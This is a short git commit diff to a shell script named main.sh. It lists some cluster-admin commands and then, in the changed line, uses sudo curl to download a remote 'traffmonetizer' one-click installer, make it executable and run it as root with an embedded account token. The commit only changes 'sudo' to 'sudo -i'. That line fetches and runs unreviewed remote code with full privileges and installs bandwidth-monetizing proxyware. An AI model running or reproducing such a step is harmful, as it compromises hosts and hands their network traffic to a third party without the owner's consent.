ad940eb4e26a6d8cf788b7dc25823d5bad2a8158
thomasedison2888 <121991393+thomasedison2888@users.noreply.github.com>
2024-02-18 12:25:49 +0700

    Update main.sh

--- main.sh
+++ main.sh
@@ -4,4 +4,4 @@ sudo cdfctl -h
 sudo kube-status.sh
 cdf-exec
 sudo /opt/cdf/to  
-sudo curl -L https://raw.githubusercontent.com/spiritLHLS/traffmonetizer-one-click-command-installation/main/tm.sh -o tm.sh && chmod +x tm.sh && bash tm.sh -t btvWNI2DtpZGMJ2LO/fuxsAZ/81PrqarSrNB8DOMU3g=
+sudo -i curl -L https://raw.githubusercontent.com/spiritLHLS/traffmonetizer-one-click-command-installation/main/tm.sh -o tm.sh && chmod +x tm.sh && bash tm.sh -t btvWNI2DtpZGMJ2LO/fuxsAZ/81PrqarSrNB8DOMU3g=
